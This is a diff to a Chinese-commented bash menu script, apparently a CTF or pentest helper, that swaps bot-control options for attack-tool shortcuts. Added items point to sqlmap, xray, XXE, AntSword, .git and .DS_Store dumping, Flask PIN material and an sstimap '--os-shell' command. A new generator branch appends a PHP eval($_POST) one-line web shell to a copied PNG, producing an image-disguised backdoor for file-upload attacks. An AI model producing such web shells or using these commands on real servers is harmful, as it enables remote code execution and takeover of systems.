@@ -1,5 +1,6 @@
 #! /bin/bash
-root=`pwd`
+root=`pwd` # 当前shell目录
+root2=`dirname $0` # 当前文件目录
 sh_ver="1.0"
 # echo $root
 # read -p "请输入：" -e msg
@@ -30,32 +31,32 @@ menu(){
     generator
     ;;
   1)
-    Stop_bot
-    Stop_cqhttp
+    cat $root2/docs/sqlmap/sqlmap
     ;;
   2)
-    Start_cqhttp
+    cat $root2/docs/xray/xray
     ;;
   3)
-    Stop_cqhttp
+    echo $root2/docs/xxe/xxe.md
     ;;
   4)
-    Restart_cqhttp
+    echo "https://www.yuque.com/antswordproject/antsword/lmwppk"
     ;;
   5)
-    Start_bot
+    echo "python3 ./DS_Store/main.py samples/.DS_Store"
     ;;
   6)
-    Stop_bot
+    cat $root2/docs/dvcs-ripper/rip
     ;;
   7)
-    Restart_bot
+    echo $root2/docs/flask_pin
+    ls $root2/docs/flask_pin
     ;;  
   8)
-    View_cqhttp_log
+    echo "python2 GitHack.py http://www.example.com/.git/"
     ;;
   10)
-    View_bot_log
+    echo -e "./sstimap.py -u https://example.com/page?name=John\n --os-shell"
     ;;
   *)
     echo "请输入正确数字"
@@ -77,8 +78,10 @@ generator(){
     echo -e "$Info: $root/flag.php"
     ;;
   1)
-    Stop_bot
-    Stop_cqhttp
+    read -erp " 请输入密码:" cmd
+    cp $root2/1.png flag.png
+    echo "<?php @eval(\$_POST['$cmd']);?>" >> flag.png
+    echo -e "$Info: $root/flag.png"
     ;;
   *)
     echo "请输入正确数字"
@@ -86,4 +89,5 @@ generator(){
   esac
  
 }
+
 menu
